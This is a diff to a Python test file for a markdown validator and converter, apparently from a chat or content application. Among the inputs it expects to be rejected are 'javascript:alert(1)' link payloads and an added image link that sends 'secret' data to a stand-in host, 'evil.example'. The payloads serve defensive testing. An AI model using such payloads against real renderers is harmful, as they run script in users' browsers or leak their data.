@@ -34,6 +34,9 @@ def test_markdown_and_suggestions_join_the_typed_block_union():
     "xem [x][1]\n\n[1]: javascript:alert(1)",
     "x" * 4001,
     " ",
+    "![x](https://evil.example/p?d=secret)",
+    "> [1]: javascript:alert(1)",
+    "- [1]: javascript:alert(1)",
 ])
 def test_markdown_rejects_html_unsafe_links_and_oversize(content):
     with pytest.raises(ValidationError):
@@ -83,6 +86,21 @@ def test_legacy_clients_receive_text_with_stable_ids():
 
 def test_markdown_to_text_strips_emphasis():
     assert markdown_to_text("*nghiêng* và __đậm__") == "nghiêng và đậm"
+
+
+def test_markdown_accepts_prose_less_than():
+    assert isinstance(_BLOCK.validate_python(markdown("nếu A < B thì")), MarkdownBlock)
+
+
+def test_markdown_to_text_keeps_urls_and_snake_case_intact():
+    assert markdown_to_text("xem [trang](https://ihrd.vn/nganh_cong_nghe_thong_tin)") == \
+        "xem trang (https://ihrd.vn/nganh_cong_nghe_thong_tin)"
+    assert markdown_to_text("user_name_id và _nghiêng_") == "user_name_id và nghiêng"
+    assert markdown_to_text("[**a**](https://x.vn/a_b_c)") == "a (https://x.vn/a_b_c)"
+
+
+def test_markdown_to_text_degrades_link_with_leading_space():
+    assert markdown_to_text("[a]( https://x)") == "a (https://x)"
 
 
 def test_degradable_types_are_the_content_blocks():
